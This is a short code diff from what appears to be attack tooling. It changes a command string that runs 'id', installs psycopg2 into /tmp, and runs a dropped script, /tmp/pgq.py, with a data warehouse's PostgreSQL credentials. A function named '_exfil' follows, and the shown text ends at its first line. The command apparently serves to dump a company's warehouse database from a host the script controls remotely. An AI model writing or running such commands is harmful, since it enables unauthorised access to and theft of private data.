@@ -33,7 +33,7 @@ sys.stdout.write("\n\n".join(out))
 '''
 
 CMD = r'''
-id; echo "===PYCHECK==="; python3 -c "import psycopg2;print('psycopg2 ok')" 2>&1 | tail -2; echo "===RUN1==="; WAREHOUSE_PG_HOST=$WAREHOUSE_PG_HOST WAREHOUSE_PG_PORT=$WAREHOUSE_PG_PORT WAREHOUSE_PG_USER=$WAREHOUSE_PG_USER WAREHOUSE_PG_PASSWORD=$WAREHOUSE_PG_PASSWORD WAREHOUSE_PG_DATABASE=$WAREHOUSE_PG_DATABASE python3 /tmp/pgq.py 2>&1 | head -120000
+id; echo "===PIP==="; python3 -m pip install -q --disable-pip-version-check --target /tmp/pglib psycopg2-binary 2>&1 | tail -3; echo "===PYCHECK==="; PYTHONPATH=/tmp/pglib python3 -c "import psycopg2;print('ok')" 2>&1|tail -2; python3 -c "import psycopg2;print('psycopg2 ok')" 2>&1 | tail -2; echo "===RUN1==="; WAREHOUSE_PG_HOST=$WAREHOUSE_PG_HOST WAREHOUSE_PG_PORT=$WAREHOUSE_PG_PORT WAREHOUSE_PG_USER=$WAREHOUSE_PG_USER WAREHOUSE_PG_PASSWORD=$WAREHOUSE_PG_PASSWORD WAREHOUSE_PG_DATABASE=$WAREHOUSE_PG_DATABASE PYTHONPATH=/tmp/pglib python3 /tmp/pgq.py 2>&1 | head -120000
 '''
 
 def _exfil(cmd):
